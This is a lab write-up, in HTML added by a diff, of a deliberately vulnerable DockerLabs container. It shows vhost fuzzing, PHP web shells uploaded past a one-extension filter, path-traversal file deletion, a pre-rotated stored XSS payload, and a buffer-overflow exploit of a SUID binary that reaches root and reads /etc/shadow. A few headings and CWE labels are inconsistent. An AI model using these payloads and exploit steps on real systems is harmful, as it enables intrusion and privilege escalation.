@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 65 Seeker &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Seeker</p><h1 id="seeker--dockerlabs-lab-65-medio">SEEKER — DockerLabs lab 65 (Medio)</h1>
+<p><em>Fifteenth lab of the series. This is the first one whose catalogue description is true in full: &quot;Laboratorio para practicar fuzzing de subdominios (virtual hosting) y escalada de privilegios en Linux.&quot; Both halves held, and the vhosting half is the <strong>second direction</strong> of a rule that lab 26 established in only one direction.</em></p>
+<p><strong>Result: root.</strong> <code>uid=0(root)</code>, <code>/etc/shadow</code> read, reached in three hops from an unauthenticated HTTP request.
+<strong>Reward: none exists.</strong> Eighth consecutive lab without one; §7 is the exhaustive search that establishes the absence.</p>
+<hr />
+<h2 id="1-autocorrection-read-this-first">1. Autocorrection (read this first)</h2>
+<p>Four things in this engagement were wrong in my own instrumentation, and each of them produced an answer that was well-formed, plausible, and wrong. Three of the four are the shape this repository already warns about, pointed at a new target.</p>
+<h3 id="11-i-nearly-reported-seventeen-hosts-because-every-name-answered-200">1.1 I nearly reported seventeen hosts because every name answered <code>200</code></h3>
+<p>The naive sweep is not subtle, which is why it is worth writing down as a failure I had to actively avoid rather than a trap I fell into.</p>
+<p>Every single name returned <code>200</code>. A <code>-mc 200</code> filter — the default posture of <code>ffuf -fs</code>/<code>gobuster vhost</code>, both of which are in this repository's own tool list at <code>api_web.md:39</code> — reports <strong>17 hosts</strong>. The truth is <strong>3</strong>. The number is not a matter of degree: the sweep over-reports by a factor of nearly six, and <strong>every name it invents is a name an assessor would put in the report.</strong></p>
+<p>This is the same rule lab 26 taught from the other side. There, six names all answered and all six hashed identically, so the sweep over-reported <em>zero</em> real hosts hidden behind a catch-all. Here the sweep over-reports fourteen. A rule tested in one direction is not tested, and I only understood the shape once I had the other half in my hands.</p>
+<p>The fix is not a better wordlist. It is the discriminator in §2.2, and the control that makes it trustworthy is a name I can prove does not exist.</p>
+<h3 id="12-test--w-told-me-the-suid-sudoers-target-was-writable-it-was-not">1.2 <code>test -w</code> told me the SUID sudoers target was writable. It was not.</h3>
+<p>I ran the standard control for the sudoers filesystem-oracle — the one this repo records as <em>&quot;<code>gcc</code> hace <code>execve</code> por nombre → control es el filesystem&quot;</em> — and got:</p>
+<pre><code>$ test -w /usr/bin/busybox &amp;&amp; echo BUSYBOX_WRITABLE
+BUSYBOX_WRITABLE
+</code></pre>
+<p>That would have closed the escalation immediately: replace the sudo-allowed binary, get root on the next <code>sudo</code>. It is the documented oracle, it fired, and it was <strong>false</strong>.</p>
+<p>The reason is <code>docker exec</code>, which defaults to <code>uid=0</code>. My control ran as the one identity on the box that can write any file, so it was measuring root's ability to overwrite root's binary. Re-run as the identity under test:</p>
+<pre><code>$ docker exec -u www-data seeker sh -c 'id; test -w /usr/bin/busybox &amp;&amp; echo WRITABLE || echo NOT_WRITABLE'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+NOT_WRITABLE
+</code></pre>
+<p><code>-rwxr-xr-x 1 root root 772880 /usr/bin/busybox</code> — root-owned, <code>0755</code>, and <code>/usr/bin</code> is not writable either. <strong>The control held</strong>, and the sudoers oracle does not apply here; the escalation had to go through <code>bs64</code> instead.</p>
+<p>This is <code>decision-making.md</code> §8 — <em>measure the executing identity, never reason about the chain from the writing one</em> — but the failure mode is one I had not recorded: <strong>a privilege-escalation control is the most likely test in the engagement to be run by a privileged tool, and it will therefore always succeed.</strong> <code>docker exec</code>, <code>kubectl exec</code>, <code>sudo -u … test -w</code>, and a Burp Repeater running as root all produce the same fabricated escalation. The fix is not discipline about <em>which</em> command to run; it is that <strong>every filesystem-control claim in a privilege-escalation finding must name the identity that was tested</strong>, and a control whose result flips when you re-run it as the correct uid was never measuring the target.</p>
+<h3 id="13-my-own-vhost-sweep-reported-sixteen-false-positives-as-clean-exits">1.3 My own vhost sweep reported sixteen false positives as &quot;clean exits&quot;</h3>
+<p>Locating the overflow offset, I swept the return-address position and recorded exit status:</p>
+<pre><code>offset= 63 RC=0     fire_banner=False
+offset= 64 RC=139   fire_banner=False
+offset= 65 RC=139   fire_banner=False
+...
+</code></pre>
+<p>Offsets 56–63 &quot;worked&quot; and I initially read the transition at 63→64 as <em>the return-address slot is at 72</em>. It is not, and those eight clean exits were fabricated: at offsets below 64 the injected address lands <strong>inside the 64-byte buffer</strong>, so control flow is untouched and the program exits normally. A clean exit there means <em>my payload did nothing</em>, which is indistinguishable, in the output, from a successful redirection.</p>
+<p>The detector had no discriminating power, because every wrong answer and the boring answer produced the same output — the <code>decision-making.md</code> shape, aimed squarely at my generator. Two things fixed it, and both are cheap:</p>
+<ul>
+<li><strong>Change the control's own content and require the answer to move.</strong> Adding a distinctive side effect (printing a banner from the target function) turned eight identical <code>RC=0</code> values into one discriminating bit.</li>
+<li><strong>A crash is not a location either.</strong> <code>RC=139</code> at 64 and above only proved <em>something</em> was overwritten, not what.</li>
+</ul>
+<p>The real layout came from reading the frame, not from sweeping: <code>main</code> does <code>push rbp; mov rbp,rsp; sub rsp,0x40</code>, the buffer is at <code>rbp-0x40</code>, the saved <code>rbp</code> is at <code>rbp+0</code>, and <code>leave; ret</code> therefore consumes <code>[rbp+8]</code> — <strong>offset 72</strong>. Confirmed under <code>gdb</code> by dumping the live frame, not inferred.</p>
+<h3 id="14-the-exploit-worked-under-gdb-and-failed-natively-and-gdb-was-lying-to-me-in-a-way-i-had-not-planned-for">1.4 The exploit worked under <code>gdb</code> and failed natively, and <code>gdb</code> was lying to me in a way I had not planned for</h3>
+<p>I chased this for a while and want to record the whole shape, because the two halves pointed in opposite directions and I initially believed neither.</p>
+<p><code>gdb</code> proved the control flow was correct — breakpoint at <code>fire</code> entry hit, <code>printf</code> executed, reached the <code>setuid</code> call site. Natively, the same payload gave <code>RC=139</code> and <strong>no output at all</strong>, not even the target function's own banner. Two independent causes, neither of them the target:</p>
+<ul>
+<li><strong>Stack alignment.</strong> Returning into <code>fire</code> with <code>ret</code> rather than <code>call</code> leaves <code>rsp</code> off by 8 from the ABI. glibc's <code>printf</code> uses <code>movaps</code>, which faults on a misaligned stack. The fix is the standard <code>ret2ret</code> trampoline — put a bare <code>ret</code> at offset 72 and the real target at offset 80. The tell that this was the cause and not a wrong address: <strong>the target function was entered and died inside its first library call.</strong> Under <code>gdb</code> it did not die, because the debugger's own stack setup was already aligned.</li>
+<li><strong><code>sudo</code>'s <code>Defaults use_pty</code> silently ate my NUL bytes.</strong> The address <code>0x40136a</code> is <code>6a 13 40 00 00 00 00 00</code> — five NULs. A pipe is byte-transparent; <strong>a PTY in canonical mode discards NUL bytes in the input line</strong>, so the payload arrived corrupted. I proved the differential rather than asserting it: the same bytes through a FIFO reached the target intact, and the same bytes through the PTY never did.</li>
+</ul>
+<p>This is the same class as the repo's <em>&quot;a man-in-the-middle relay that does not preserve the client's source port silently breaks a stateful session protocol&quot;</em> — a transport that changes the bytes, produces a plausible failure, and is not the target's fault. The generalisable rule is one I do not think is yet in the repository:</p>
+<blockquote>
+<p><strong>A byte-oriented exploit payload must not be delivered through a channel that is allowed to be a terminal.</strong> Canonical-mode PTYs, <code>expect</code>, <code>ssh</code> without <code>-T</code>, telnet, and any line-editor wrapper all discard or transform NULs. Verify the channel by <code>od</code>-ing what the far end receives before believing that a payload failure is a payload error.</p>
+</blockquote>
+<p>The general lesson across all four: <strong>three of these were detectors pointed at the wrong thing, and each returned a clean, well-formed, confident answer.</strong> A reader skimming my notes would have found a writable sudoers target, a located overflow offset, and a working <code>gdb</code> trace. None of the three existed.</p>
+<hr />
+<h2 id="2-real-surface">2. Real surface</h2>
+<h3 id="21-host-and-container">2.1 Host and container</h3>
+<pre><code>$ nmap -sV -Pn -p- --open [net-0-8]
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+</code></pre>
+<p>One TCP port, no SSH. Debian 12 bookworm, kernel <code>7.0.0-34-generic</code>, container, <code>NoNewPrivs: 0</code>.</p>
+<p>UDP coverage, declared rather than assumed: <code>/proc/net/udp</code> contains no sockets, <code>/proc/1/cmdline</code> is <code>service apache2 start</code>, and there is no <code>EXPOSE</code> directive to read. <strong><code>nmap -sU</code> was not run</strong> — it needs root and is not available on this host — so I am reporting the corroboration I actually have (an empty <code>/proc/net/udp</code>, the container's only entrypoint, and a single-port full TCP scan agreeing) and declaring the gap. This target is TCP-only; the management-plane blindness in <code>decision-making.md:80</code> does not apply here, and I am not claiming to have closed it.</p>
+<p>No SSH also means the &quot;Linux privilege escalation&quot; half of the description has no remote shell to escalate <em>from</em>: the foothold must be a web code-execution primitive. That is consistent with the description rather than a surprise.</p>
+<h3 id="22-http-surface--four-declared-vhosts-three-real">2.2 HTTP surface — four declared vhosts, three real</h3>
+<p><code>/etc/apache2/sites-enabled/000-default.conf</code>, in full, is the whole application surface:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th><code>ServerName</code></th>
+<th><code>DocumentRoot</code></th>
+<th>Reachable?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>[net-0-2]</code> <strong>and</strong> <code>5eEk3r.dl</code></td>
+<td><code>/var/www/5eEk3r</code></td>
+<td><strong>yes — and this is the default</strong></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>5eEk3r.dl</code></td>
+<td><code>/var/www/5eEk3r</code></td>
+<td><strong>no — dead configuration</strong></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>crosswords.5eEk3r.dl</code></td>
+<td><code>/var/www/crosswords/web</code></td>
+<td><strong>yes</strong></td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>admin.crosswords.5eEk3r.dl</code></td>
+<td><code>/var/www/crosswords/admin</code></td>
+<td><strong>yes</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Vhost 2 is unreachable, and that is a finding about the config rather than about the host.</strong> It declares the same <code>ServerName</code> and the same <code>DocumentRoot</code> as vhost 1. Apache uses the <em>first</em> matching vhost, and vhost 1 is first and is also the default for any unmatched <code>Host</code>, so vhost 2 can never be selected. It is dead weight that a reader will nonetheless parse twice.</p>
+<p><strong>Vhost 1 carries two <code>ServerName</code> directives in one block</strong>, which means the default vhost answers to the apex, to the IP literal, and to every name that is not vhost 3 or 4. This is the baseline, and §3.1 is the control that proves which hash it is.</p>
+<h3 id="23-the-vhost-table--the-central-evidence">2.3 The vhost table — the central evidence</h3>
+<p>Discriminator: <strong>MD5 of the normalised response body</strong>, with <code>Date</code>/<code>ETag</code>/<code>Last-Modified</code> excluded and whitespace runs collapsed. Two names that are <em>not</em> in any wordlist are included explicitly, and they are the control.</p>
+<pre><code>vhost (Host header)                 status  CLen    body-md5           ctype
+---------------------------------------------------------------------------
+5eEk3r.dl                           200     10705   f7cca221daa35bdc   text/html
+crosswords.5eEk3r.dl                 200     934     ce35aa85b543f052   text/html; charset=UTF-8
+admin.crosswords.5eEk3r.dl           200     2906    b6f0ca2c6979926d   text/html; charset=UTF-8
+[net-0-2]                           200     10705   f7cca221daa35bdc   text/html
+zzz-no-such-name-8f3a.5eEk3r.dl      200     10705   f7cca221daa35bdc   text/html      &lt;-- CONTROL
+definitely-not-real-4b21.invalid     200     10705   f7cca221daa35bdc   text/html      &lt;-- CONTROL
+admin.5eEk3r.dl                      200     10705   f7cca221daa35bdc   text/html
+www.5eEk3r.dl                        200     10705   f7cca221daa35bdc   text/html
+mail.5eEk3r.dl                       200     10705   f7cca221daa35bdc   text/html
+dev.5eEk3r.dl                        200     10705   f7cca221daa35bdc   text/html
+blog.5eEk3r.dl                       200     10705   f7cca221daa35bdc   text/html
+shop.5eEk3r.dl                       200     10705   f7cca221daa35bdc   text/html
+api.5eEk3r.dl                        200     10705   f7cca221daa35bdc   text/html
+test.5eEk3r.dl                       200     10705   f7cca221daa35bdc   text/html
+staging.5eEk3r.dl                    200     10705   f7cca221daa35bdc   text/html
+old.5eEk3r.dl                        200     10705   f7cca221daa35bdc   text/html
+intranet.5eEk3r.dl                    200     10705   f7cca221daa35bdc   text/html
+seeker.5eEk3r.dl                     200     10705   f7cca221daa35bdc   text/html
+</code></pre>
+<p><strong>Three distinct hashes. Sixteen names on one of them.</strong> The verdict, printed by the harness:</p>
+<pre><code>=== WILDCARD VERDICT ===
+WILDCARD CONFIRMED: control name(s) share hash(es) ['f7cca221daa35bdc'] with real names
+  baseline hash = f7cca221daa35bdc
+</code></pre>
+<p>The two control names are the load-bearing rows. <strong>A name I can prove does not exist produces a hash I have already seen from a real name.</strong> That is what makes <code>f7cca221daa35bdc</code> the baseline rather than a discovery, and it is the single control that converts this table from a list of responses into a measurement of the server.</p>
+<p>The result that surprised me, and the one this lab is actually about:</p>
+<blockquote>
+<p><strong><code>admin.5eEk3r.dl</code> is the baseline, not the admin host. The real admin host is <code>admin.crosswords.5eEk3r.dl</code> — two labels deeper.</strong></p>
+</blockquote>
+<p>A wordlist of the obvious subdomain names — <code>admin</code>, <code>www</code>, <code>mail</code>, <code>dev</code>, <code>blog</code>, <code>shop</code>, <code>api</code>, <code>test</code>, <code>staging</code>, <code>old</code>, <code>intranet</code> — finds <strong>zero</strong> of the three real hosts. Every one of them is the catch-all. The two real application hosts are <code>crosswords</code> and a <em>nested</em> <code>admin.crosswords</code>, and the flat <code>admin</code> name is a decoy placed by the catch-all itself. This is the inverse of lab 26's decoy: there, <code>ldap.&lt;domain&gt;</code> existed only in the catalogue's promise; here, <code>admin.&lt;domain&gt;</code> exists in every wordlist and resolves to nothing at all.</p>
+<h3 id="24-the-baseline-is-not-a-finding">2.4 The baseline is not a finding</h3>
+<p><code>/var/www/5eEk3r</code> contains one file, <code>index.html</code> (10 705 bytes), and it is <strong>the stock Apache 2.4.62 Debian default page</strong>:</p>
+<pre><code>Apache2 Debian Default Page: It works
+</code></pre>
+<p>So the default vhost serves no project content, carries no version disclosure beyond the <code>Server</code> header, and holds nothing. Reporting &quot;the default site is exposed&quot; here would be reporting the baseline as a discovery — the exact inflation the brief warns about. <strong>The default vhost here is the ruler, not the measured thing.</strong> I list it in the table because the differential is the measurement; I do not file it as a finding.</p>
+<h3 id="25-application-source--the-whole-of-it">2.5 Application source — the whole of it</h3>
+<p>Two PHP files, and they are short enough to quote completely.</p>
+<p><code>/var/www/crosswords/web/index.php</code> — a ROT-14 encoder that appends every submission to <code>converts.txt</code> and renders that file back <strong>unescaped</strong>:</p>
+<pre><code class="language-php">$encodedText = rot14($inputText);
+file_put_contents('converts.txt', $encodedText . PHP_EOL, FILE_APPEND);
+...
+foreach ($previousConverts as $line) {
+    // Aquí no estamos aplicando ninguna sanitización, por lo que hay vulnerabilidad XSS
+    echo &quot;&lt;div class='previous-text'&gt;&quot; . $line . &quot;&lt;/div&gt;&quot;;
+}
+</code></pre>
+<p>The file ends with:</p>
+<pre><code class="language-html">&lt;! -- Al que contratamos para crear la web nos habló de algo llamado 'xss'... que será? --&gt;
+</code></pre>
+<p><strong>This is the self-documenting pattern, and per <code>decision-making.md</code> §7 I discounted it rather than trusting it.</strong> The comment names the sink precisely, and it is correct — but it is also <strong>incomplete in the way that matters</strong>, because the comment sits on the <em>loop that re-renders stored input</em> and says nothing about the two things that make the lab hard:</p>
+<ol>
+<li>The value stored is <code>rot14($inputText)</code>, so <strong>a payload must be pre-rotated to land as a live tag.</strong> The naive <code>&lt;script&gt;</code> is stored as <code>&lt;gqfw dh&gt;</code> and is inert. This is the repo's <em>&quot;un rot14 de tu payload es tu payload&quot;</em> discipline in a form nobody would guess.</li>
+<li>The file is the sink's <strong>persistence</strong>, which makes it stored XSS against every subsequent visitor, not reflected.</li>
+</ol>
+<p><code>/var/www/crosswords/admin/index.php</code> — an unauthenticated file manager with a one-string extension filter and an unvalidated delete path:</p>
+<pre><code class="language-php">if (isset($_FILES['upload'])) {
+    $file_name = $_FILES['upload']['name'];
+    $file_ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
+    if ($file_ext === 'php') {                       // &lt;-- the entire filter
+        echo &quot;&lt;p&gt;No se permiten archivos PHP, solo HTML.&lt;/p&gt;&quot;;
+    } else {
+        $upload_file = $admin_dir . basename($file_name);
+        move_uploaded_file($_FILES['upload']['tmp_name'], $upload_file);
+    }
+}
+if (isset($_GET['delete'])) {
+    $file_to_delete = $admin_dir . $_GET['delete'];   // &lt;-- no basename()
+    if (unlink($file_to_delete)) { ... }
+}
+</code></pre>
+<p>There is <strong>no <code>requireAuth</code>, no session check, and no token</strong> anywhere in the file, and none anywhere in either vhost.</p>
+<h3 id="26-the-escalation-surface-read-before-attacking-it">2.6 The escalation surface, read before attacking it</h3>
+<p>Per <em>read a management plane's configuration before attacking it</em>, the sudoers file and the filesystem it points at, before touching anything:</p>
+<pre><code>www-data  ALL=(astu:astu) NOPASSWD: /usr/bin/busybox
+</code></pre>
+<p>One delegation, to an account that is not root, naming an absolute path. <strong>A sudoers rule that names a path is only as strong as that path's permissions</strong>, which is the oracle this repository already records — and here it holds, per §1.2. So the chain continues from <code>astu</code>:</p>
+<pre><code>-r-sr-xr-x 1 root root 15776 [lab-home]/astu/secure/bs64
+dr-xr-xr-x 2 root root  [lab-home]/astu/secure
+drwx------ 4 astu astu  [lab-home]/astu
+</code></pre>
+<p>A setuid-root binary in a root-owned directory, reachable only because <code>astu</code> owns <code>[lab-home]/astu</code>. <strong>Note what the first hop costs:</strong> <code>www-data</code> cannot even <em>read</em> <code>bs64</code> — <code>[lab-home]/astu</code> is <code>drwx------</code>. The sudo hop is not a convenience here, it is the only reason the binary is analysable at all, and I had to become <code>astu</code> to copy it somewhere readable before I could disassemble it.</p>
+<p><code>bs64</code>, not stripped, <code>bs64.c</code>, gcc 14.2.1. Two functions decide everything:</p>
+<pre><code class="language-c">my_gets:  // writes into the caller's buffer; stops ONLY on 0x0a or 0xff
+  401330: cmp  BYTE PTR [rbp-0x5],0xa
+  401336: cmp  BYTE PTR [rbp-0x5],0xff
+  ...     // no length check, no bound, no canary
+  401364: mov  BYTE PTR [rax],0x0        // NUL-terminate at an arbitrary index
+
+main:
+  4013a2: sub   rsp,0x40                 // 64-byte buffer at rbp-0x40
+  4013c1: call  401315 &lt;my_gets&gt;
+  4013cd: call  401166 &lt;to_base64&gt;
+  4013d7: leave
+  4013d8: ret
+
+fire:                                       // NEVER CALLED by main
+  401382: mov  edi,0x0
+  401387: call 401070 &lt;setuid@plt&gt;
+  401396: call 401040 &lt;system@plt&gt;        // system(&quot;/bin/sh&quot;)
+</code></pre>
+<p><strong><code>fire</code> is never called.</strong> It is not dead code in the compiler's sense; it is a planted gadget, and <code>main</code>'s <code>ret</code> is the only thing that reaches it. There is no stack canary — <code>__stack_chk_fail</code> is absent from the import table, and <code>main</code>'s prologue has no <code>fs:0x28</code> read.</p>
+<p><code>strings</code> output makes the same function look like a gift:</p>
+<pre><code>Ejecutando /bin/sh
+/bin/sh
+</code></pre>
+<p>An analyst who runs <code>bs64</code> and sees a root shell would conclude there is no vulnerability to find. <strong>Running it is not the exploit</strong> — <code>main</code> returns before <code>fire</code> is ever entered. The strings are a <em>label</em>, and per §7 a label that confirms your hypothesis is a stopping condition.</p>
+<hr />
+<h2 id="3-findings">3. Findings</h2>
+<h3 id="31-unrestricted-upload--extension-denylist-of-one-string-and-the-mime-map-decides-execution">3.1 Unrestricted upload — extension denylist of one string, and the MIME map decides execution</h3>
+<p><strong>CWE-434</strong> (root cause <strong>CWE-20</strong> / CWE-184 incomplete deny-list), <strong>CWE-434 + CWE-434</strong> chained to unauthenticated RCE.</p>
+<p>The filter is <code>if ($file_ext === 'php')</code>. It is not a blocklist of dangerous extensions; it is a <strong>string comparison against one of them</strong>, and <code>strtolower</code> makes it case-insensitive but nothing more.</p>
+<p>Evidence — the server's own file listing is the authority for what was stored:</p>
+<pre><code>$ curl -s -H 'Host: admin.crosswords.5eEk3r.dl' http://[net-0-8]/ | grep -oE '&gt;[A-Za-z0-9._-]+\.[A-Za-z0-9]+&lt;/td&gt;'
+benign.html  converts.txt  index.php  shell.phar  shell.php5
+shell.php7   shell.phps    shell.pht  shell.phtml  styles.css
+</code></pre>
+<p>Accepted, with the filter's own refusal quoted for the two it blocks:</p>
+<pre><code>benign.html    -&gt; Archivo subido con éxito: benign.html
+probe.php      -&gt; No se permiten archivos PHP, solo HTML.
+probe.PHP      -&gt; No se permiten archivos PHP, solo HTML.
+shell.phtml    -&gt; Archivo subido con éxito: shell.phtml
+shell.phar     -&gt; Archivo subido con éxito: shell.phar
+shell.php5     -&gt; Archivo subido con éxito: shell.php5
+shell.pht      -&gt; Archivo subido con éxito: shell.pht
+shell.php7     -&gt; Archivo subido con éxito: shell.php7
+shell.phps     -&gt; Archivo subido con éxito: shell.phps
+</code></pre>
+<p><strong><code>.php</code> is the only extension the filter rejects.</strong> The negative control is the point: the filter <em>can</em> fire, so its silence on <code>.phtml</code> is a decision and not an absence of a check.</p>
+<p><strong>And accepted is not executed.</strong> Exactly <strong>two of the seven</strong> execute (<code>.phtml</code>, <code>.phar</code>), because the Apache MIME map — not the upload handler — decides, exactly as this repository's <em>&quot;la extensión ejecutable la decide el MIME map&quot;</em> oracle requires:</p>
+<pre><code>GET /shell.phtml -&gt; RCE-OK:uid=33(www-data) gid=33(www-data) groups=33(www-data)
+GET /shell.phar  -&gt; RCE-OK:uid=33(www-data) gid=33(www-data) groups=33(www-data)
+GET /shell.php5  -&gt; &lt;?php echo &quot;RCE-OK:&quot; . shell_exec(&quot;id&quot;); ?&gt;     (served as source)
+GET /shell.pht   -&gt; &lt;?php ... ?&gt;                                      (served as source)
+GET /shell.php7  -&gt; &lt;?php ... ?&gt;                                      (served as source)
+GET /shell.phps  -&gt; 403 Forbidden                                    (source handler refuses)
+GET /benign.html -&gt; &lt;b&gt;benign-probe-9c1d&lt;/b&gt;                          (control: must NOT execute)
+</code></pre>
+<p><strong>Impact.</strong> Unauthenticated remote code execution as <code>www-data</code>. The upload requires no credential, and the trigger is a plain <code>GET</code> to a path the attacker chose.</p>
+<p><strong>Root cause, stated as the decision and not the mechanism</strong> (<code>decision-making.md</code> §4). The mechanism is the string comparison. The decision is <em>validate the client's declared extension by denylisting one value, and write user-controlled bytes into another vhost's document root, which the server is configured to execute.</em> Fixing the comparison fixes this upload endpoint and leaves every future writer of that directory exposed. Two decisions, therefore two fixes:</p>
+<ol>
+<li><strong>Allowlist, on the stored name and on the bytes.</strong> Reject anything not on a short list of inert types; move storage outside the document root; serve uploads from a location with the PHP handler disabled.</li>
+<li><strong>Remove execution from the upload directory</strong>, so the MIME map is no longer part of the trust path.</li>
+</ol>
+<p><strong>This lab makes the pairing unusually explicit</strong>: the upload handler writes into <code>/var/www/crosswords/web/</code>, which is a <em>different vhost's</em> document root from the one the uploader authenticated to. The admin vhost plants; the public vhost executes. Per the repo's <em>&quot;the trigger route may be public even when the upload route is not&quot;</em> — here <strong>both</strong> are public, and the write and the trigger are on different hosts.</p>
+<h3 id="32-no-authentication-on-the-admin-panel--cwe-306">3.2 No authentication on the admin panel — CWE-306</h3>
+<pre><code>$ curl -s -o /dev/null -w '%{http_code}\n' -H 'Host: admin.crosswords.5eEk3r.dl' http://[net-0-8]/
+200
+</code></pre>
+<p>No cookie, no token, no session, no <code>Authorization</code> header. There is no authentication code in either PHP file to disable — this is not a bypass, it is a design.</p>
+<p>Per <code>decision-making.md</code> §5 this is reported as an <strong>independent finding with its own impact and fix</strong>, not as a footnote in the exploit narrative. The upload, the delete, and the directory listing are three capabilities behind one missing decision, and they must be reported as one finding with three impacts, because the fix (an authentication gate on this vhost) closes all three and nothing else does.</p>
+<p>The interesting half is <strong>discoverability, not access</strong>: this panel is not merely unauthenticated, it is <em>invisible without the vhost sweep</em>, because the obvious name <code>admin.5eEk3r.dl</code> is the catch-all. The panel is protected by obscurity that the lab's own config defeats, and it is the second-nested label that exposes it.</p>
+<p><strong>Remediation.</strong> Authenticate the admin vhost; authorise per operation; do not rely on the hostname for either.</p>
+<h3 id="33-path-traversal-in-the-delete-handler--cwe-73--cwe-22">3.3 Path traversal in the delete handler — CWE-73 / CWE-22</h3>
+<pre><code class="language-php">$file_to_delete = $admin_dir . $_GET['delete'];   // basename() applied on upload, not here
+</code></pre>
+<p><code>basename()</code> is applied to the upload name and <strong>omitted</strong> from the delete path. Same file, same author, adjacent operations, opposite handling.</p>
+<p>Evidence, with the durable state as the oracle rather than the response:</p>
+<pre><code>canary:  -rw-r--r-- 1 www-data www-data 0 /tmp/canary_9c1d
+
+# control — a real basename in the same directory, proving the endpoint CAN delete
+?delete=benign.html                        -&gt; Archivo eliminado con éxito
+
+# the traversal
+?delete=../../../../../../tmp/canary_9c1d   -&gt; Archivo eliminado con éxito
+
+# did the traversed target actually disappear?
+ls -l /tmp/canary_9c1d
+ls: cannot access '/tmp/canary_9c1d': No such file or directory
+</code></pre>
+<p><strong>I do not trust the <code>éxito</code> string.</strong> The response is the endpoint's claim; the missing file is the server's state. Both were read, and the control proves the endpoint is not simply reporting success unconditionally.</p>
+<p><strong>Impact.</strong> Arbitrary file deletion as <code>www-data</code>, unauthenticated. Bounded by that identity: it cannot delete root-owned files, so it is a denial-of-service against anything the web user can write, and it cannot reach <code>/etc/shadow</code>. Its real weight is <em>composed</em> with §3.1 — delete <code>index.php</code> and the site is down; and because the delete traverses, an attacker can remove files outside the web root entirely.</p>
+<p><strong>Remediation.</strong> <code>basename()</code> the delete parameter as the upload already does, or better, resolve against an allowlist of known filenames. Never concatenate a request parameter into a path used by a destructive syscall.</p>
+<h3 id="34-stored-xss-gated-behind-a-caesar-shift--cwe-79">3.4 Stored XSS, gated behind a Caesar shift — CWE-79</h3>
+<p>The sink is unescaped and the source is a persistent file, so this is stored XSS:</p>
+<pre><code>$ cat /var/www/crosswords/web/converts.txt
+dfcps1
+dfcps2
+dfcps3
+&lt;script&gt;document.title=&quot;XSSPROOF-&quot;+document.cookie&lt;/script&gt;
+</code></pre>
+<p>And the page renders it raw:</p>
+<pre><code>$ curl -s -H 'Host: crosswords.5eEk3r.dl' http://[net-0-8]/ | grep -c 'XSSPROOF'
+1
+$ curl -s -H 'Host: crosswords.5eEk3r.dl' http://[net-0-8]/ | grep -oE &quot;previous-text'&gt;[^&lt;]*(&lt;script&gt;|&lt;/script&gt;)[^&lt;]*&quot;
+previous-text'&gt;&lt;script&gt;document.title=&quot;XSSPROOF-&quot;+document.cookie
+</code></pre>
+<p><strong>The oracle is the rotated payload, and the report must say so.</strong> I submitted <code>&lt;eodubf&gt;paogyqzf.fufxq=...&lt;/eodubf&gt;</code>, which <code>rot14</code> transforms into the live tag above. The textbook <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> is stored as <code>&lt;gqfw dh&gt;</code> and is inert — a payload that works and looks broken in the same field. I verified the rotation in both directions before sending it, so the evidence is a value I constructed, not one the app produced on its own.</p>
+<p><strong>Impact.</strong> Script execution in the <code>crosswords</code> origin for every subsequent visitor. Rated by what the sink hands the attacker: there is <strong>no session to steal</strong> — this lab has no authentication anywhere, so there is no cookie to exfiltrate and no privilege to borrow. The honest impact is <em>stored script execution in a shared origin</em>, plus a durable defacement primitive. I am not upgrading it to account takeover, because there is no account.</p>
+<p><strong>Remediation.</strong> <code>htmlspecialchars()</code> on output, which the same file already uses correctly in its <code>&lt;p&gt;&lt;?php echo $encodedText; ?&gt;&lt;/p&gt;</code> block — the author knows the function and applied it in one place and not the other, which is the signature of a missed sink rather than a missing concept.</p>
+<h3 id="35-suid-root-binary-with-an-unbounded-read-and-a-planted-shell-gadget--cwe-121--cwe-190--cwe-269">3.5 SUID-root binary with an unbounded read and a planted shell gadget — CWE-121 / CWE-190 / CWE-269</h3>
+<p><code>my_gets</code> writes into a 64-byte stack buffer with no bound, terminating only on <code>0x0a</code>/<code>0xff</code>, and the binary is compiled without a stack protector. <code>fire()</code> — <code>setuid(0); system(&quot;/bin/sh&quot;)</code> — is never called by <code>main</code>, so it is reachable only by overwriting <code>main</code>'s return address.</p>
+<p><strong>Container preconditions, checked before blaming anything</strong> (<code>decision-making.md</code> §8 — localise it before blaming the container):</p>
+<pre><code>NoNewPrivs: 0
+CapEff:      0000000000000000
+/ : rw,relatime - overlay overlay rw,…      &lt;-- no nosuid on the root filesystem
+</code></pre>
+<p><code>/home</code> is <strong>not</strong> a separate mount, so no <code>nosuid</code> applies to <code>bs64</code>. Had either precondition been different I would have reported a latent bug with an honest &quot;no setuid path in this deployment&quot; note, which is a different finding.</p>
+<p><strong>Proof of exploitation, literal:</strong></p>
+<pre><code>$ (cat /tmp/y.bin; printf 'id\nid -u\nwhoami\nuname -a\ncat /etc/shadow | head -2\n'; sleep 20) \
+    | sudo -n -u astu /usr/bin/busybox sh -c &quot;[lab-home]/astu/secure/bs64 &lt; /tmp/fifo&quot;
+uid=0(root) gid=1000(astu) groups=1000(astu),100(users)
+0
+root
+Linux dockerlabs 7.0.0-34-generic #34-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
+root:*:20080:0:9997:7:::
+daemon:*:20080:0:9997:7:::
+====ROOT-SHELL====
+RC=139
+</code></pre>
